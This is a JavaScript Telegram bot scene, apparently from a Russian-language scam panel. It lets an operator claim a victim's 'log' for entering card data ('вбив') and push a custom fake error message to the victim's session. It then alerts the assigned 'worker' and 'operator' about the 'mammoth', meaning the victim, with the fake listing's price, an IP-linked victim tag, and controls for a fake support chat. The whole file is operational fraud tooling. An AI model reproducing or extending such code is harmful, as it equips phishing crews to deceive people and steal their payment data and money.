const WizardScene = require("telegraf/scenes/wizard");
const { Markup } = require("telegraf");

const { Log, User, Operators,IpBinding} = require("../database");

module.exports = new WizardScene(
  "log_myerror",
  async (ctx) => {
    try {
      const logId = ctx.scene.state.logId || ctx.match?.[1];

      if (!logId) {
        await ctx.reply("❌ Лог не найден");
        return ctx.scene.leave();
      }
      const log = await Log.findByPk(logId, {
        include: [
          {
            association: "ad",
            required: true,
            include: [
              {
                association: "user",
                required: true,
              },
              {
                association: "service",
                required: true,
                include: [
                  {
                    association: "country",
                    required: true,
                  },
                  {
                    association: "currency",
                    required: true,
                  },
                ],
              },
            ],
          },
          {
            association: "writer",
            required: true,
          },
        ],
      });
      if (!log)
        return ctx.answerCbQuery("❌ Лог не найден", true).catch((err) => err);
      if (log.writerId && log.writerId != ctx.from.id)
        return ctx
          .answerCbQuery("❌ Этот лог взял на вбив кто-то другой", true)
          .catch((err) => err);
      if (!log.writerId) {
        await log.update({ writerId: ctx.from.id });
      }

      await ctx.replyWithHTML(
        `<b>💬 C-PUSH</b>

<b>Введите текст</b>`,
        {
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("Отменить", "cancel2")],
          ]),
        }
      ),
        (ctx.scene.state.data = {});
      return ctx.wizard.next();
    } catch (err) {
      ctx.reply("❌ Ошибка", true).catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!ctx.message.text) {
        return ctx.replyWithHTML(
          `<b>❌ Недопустимый формат</b>
        
<i>Отправьте текст</i>`,
          {
            reply_markup: Markup.inlineKeyboard([
              [Markup.callbackButton("Отменить", "cancel")],
            ]),
          }
        );
      }

      await Log.update(
        {
          status: `error_${ctx.message.text}`,
        },
        {
          where: { id: ctx.scene.state.logId },
        }
      );
      const log = await Log.findOne({
        where: {
          id: ctx.scene.state.logId,
        },
        include: [
          {
            association: "writer",
            required: true,
          },
          {
            association: "ad",
            required: true,
            include: [
              {
                association: "user",
                required: true,
              },
              {
                association: "service",
                required: true,
                include: [
                  {
                    association: "country",
                    required: true,
                  },
                  {
                    association: "currency",
                    required: true,
                  },
                ],
              },
            ],
          },
        ],
      });

      const user = await User.findOne({
        where: { id: log.ad.userId },
      });
          const ipBinding = await IpBinding.findOne({
      where: {
        ip: log.ip, 
      },
    });

    const mammothTag = ipBinding?.identifier
      ? `#${ipBinding.identifier}`
      : "отсутствует";
      await ctx.scene.reply("<b>✅ Ошибка отправлена!</b>", {
        reply_to_message_id: ctx.message.message_id,

        parse_mode: "HTML",
      });
      await ctx.telegram.sendMessage(
        log.ad.userId,
        `<b>💬 Вашему мамонту отправили кастомный текст ${
          log.ad.service.title
        }</b>

💬 Текст: <b>${ctx.message.text}</b>
       
📦 Объявление: <b>${log.ad.title == null ? "Без названия" : log.ad.title}</b>
💰 Цена: <b>${log.ad.price}</b>

🦣 <b>${mammothTag}</b>

🔍 <b>#id${log.ad.id}</b>`,
        {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("👁️ Онлайн ", `check_mamont_${log.ad.id}`)],

            [
              Markup.callbackButton(
                "✍️ Сообщение в ТП",
                `support_${log.supportId}_send_message`
              ),
              Markup.callbackButton(
                "📋 Шаблоны ТП",
                `tempSupport_${log.supportId}_${user.id}`
              ),
            ],
            [
              Markup.callbackButton(
                "🔓 Открыть ТП",
                `open_support_${log.ad.id}`
              ),
              Markup.callbackButton(
                "🔒 Закрыть ТП",
                `close_support_${log.ad.id}`
              ),
            ],
            [
              Markup.callbackButton(
                "🔽 Дополнительно",
                `more_actions_${log.ad.id}_${log.supportId}`
              ),
            ],
          ]),
        }
      );

      if (user.operator != null) {
        const operator = await Operators.findOne({
          where: {
            userId: user.operator,
          },
        });

        await ctx.telegram.sendMessage(
          operator.userId,
          `<b>💬 Вашему мамонту отправили кастомный текст ${
            log.ad.service.title
          }</b>
          
💬 Текст: <b>${ctx.message.text}</b>
       
📦 Объявление: <b>${log.ad.title == null ? "Без названия" : log.ad.title}</b>
💰 Цена: <b>${log.ad.price}</b>

🦣 <b>${mammothTag}</b>

🔍 <b>#id${log.ad.id}</b>`,
          {
            parse_mode: "HTML",
            disable_web_page_preview: true,
            reply_markup: Markup.inlineKeyboard([
              [
                Markup.callbackButton(
                  "👁️ Онлайн ",
                  `check_mamont_${log.ad.id}`
                ),
              ],

              [
                Markup.callbackButton(
                  "✍️ Ответить за воркера",
                  `operatorSend_${log.supportId}_send_message_${user.id}_${log.ad.id}`
                ),
                Markup.callbackButton(
                  "📋 Шаблоны ТП",
                  `tempSupport_${log.supportId}_${user.id}`
                ),
              ],
              [
                Markup.callbackButton(
                  "🔓 Открыть ТП",
                  `open_support_${log.ad.id}`
                ),
                Markup.callbackButton(
                  "🔒 Закрыть ТП",
                  `close_support_${log.ad.id}`
                ),
              ],
              [
                Markup.callbackButton(
                  "🔽 Дополнительно",
                  `more_actions_${log.ad.id}_${log.supportId}`
                ),
              ],
            ]),
          }
        );
      }

      return ctx.scene.leave();
    } catch (err) {
      await ctx.scene.reply("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  }
);
